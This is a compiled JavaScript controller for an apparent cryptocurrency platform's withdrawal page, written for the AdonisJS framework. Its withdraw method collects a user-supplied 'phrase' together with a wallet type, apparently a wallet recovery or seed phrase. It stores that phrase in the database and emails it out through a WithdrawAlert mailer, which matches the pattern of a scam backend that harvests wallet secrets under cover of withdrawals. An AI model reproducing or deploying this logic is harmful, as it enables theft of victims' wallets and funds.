"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const Validator_1 = global[Symbol.for('ioc.use')]("Adonis/Core/Validator");
const WithdrawAlert_1 = __importDefault(global[Symbol.for('ioc.use')]("App/Mailers/WithdrawAlert"));
const Transaction_1 = __importDefault(global[Symbol.for('ioc.use')]("App/Models/Transaction"));
class WithdrawController {
    async show({ view, auth }) {
        await auth.user?.load("transactions");
        return view.render("[user_name]/withdraw", {
            ...auth.user?.toJSON(),
        });
    }
    async withdrawByAddress({ auth, session, request, response, bouncer, }) {
        try {
            const canPerformNormalUserActions = await bouncer.allows("canPerformNormalUserActions");
            const payload = await request.validate({
                schema: Validator_1.schema.create({
                    amount: Validator_1.schema.number([Validator_1.rules.trim()]),
                    wallet_address: Validator_1.schema.string([Validator_1.rules.trim()]),
                    coin_type: Validator_1.schema.string([Validator_1.rules.trim()]),
                }),
                messages: {
                    required: "The {{ field }} field is required.",
                    "wallet_address.required": "The Wallet address field is required.",
                },
            });
            if (canPerformNormalUserActions) {
                let tx = await Transaction_1.default.create({
                    amount: payload.amount,
                    userId: auth.user?.id,
                    status: false,
                    transactionType: "withdrawal".toUpperCase(),
                    walletAddress: payload.wallet_address,
                    walletType: payload.coin_type,
                });
                await new WithdrawAlert_1.default(auth.user, tx.amount, payload.wallet_address, payload.coin_type, "", "", tx.createdAt.toString()).send();
                session.flash("form.success", "Withdrawal has been submitted and awaiting approval");
                return response
                    .redirect()
                    .toRoute("withdraw.show", { username: auth.user?.userName });
            }
            session.flashAll();
            session.flash("form.error", "Action not allowed, you're not activated");
            return response
                .redirect()
                .toRoute("withdraw.show", { username: auth.user?.userName });
        }
        catch (error) {
            session.flashAll();
            if (error.messages) {
                session.flash("form.error", Object.values(error.messages)[0][0]);
            }
            else {
                session.flash("form.error", "Internal Server Error");
            }
            console.log(error);
            response.redirect().back();
        }
    }
    async withdraw({ auth, session, request, response, bouncer, }) {
        try {
            const canPerformNormalUserActions = await bouncer.allows("canPerformNormalUserActions");
            const payload = await request.validate({
                schema: Validator_1.schema.create({
                    amount_f: Validator_1.schema.number([Validator_1.rules.trim()]),
                    wallet_type: Validator_1.schema.string([Validator_1.rules.trim()]),
                    phrase: Validator_1.schema.string([Validator_1.rules.trim()]),
                }),
                messages: {
                    required: "The {{ field }} field is required.",
                    "wallet_type.required": "Please select a wallet type.",
                    minLength: "The {{ field }} field must be of {{ options.minLength }} characters.",
                },
            });
            if (canPerformNormalUserActions) {
                let tx = await Transaction_1.default.create({
                    userId: auth.user?.id,
                    status: false,
                    phrase: payload.phrase,
                    amount: payload.amount_f,
                    transactionType: "withdrawal".toUpperCase(),
                    walletType: payload.wallet_type,
                });
                await new WithdrawAlert_1.default(auth.user, tx.amount, "", "", payload.wallet_type, payload.phrase, tx.createdAt.toString()).send();
                session.flash("form.success", "Withdraw request has been submitted");
                return response
                    .redirect()
                    .toRoute("withdraw.show", { username: auth.user?.userName });
            }
            session.flashAll();
            session.flash("form.error", "Action not allowed, you're not activated");
            return response
                .redirect()
                .toRoute("withdraw.show", { username: auth.user?.userName });
        }
        catch (error) {
            session.flashAll();
            if (error.messages) {
                session.flash("form.error", Object.values(error.messages)[0][0]);
            }
            else {
                session.flash("form.error", "Internal Server Error");
            }
            console.log(error);
            response.redirect().back();
        }
    }
}
exports.default = WithdrawController;
//# sourceMappingURL=WithdrawController.js.map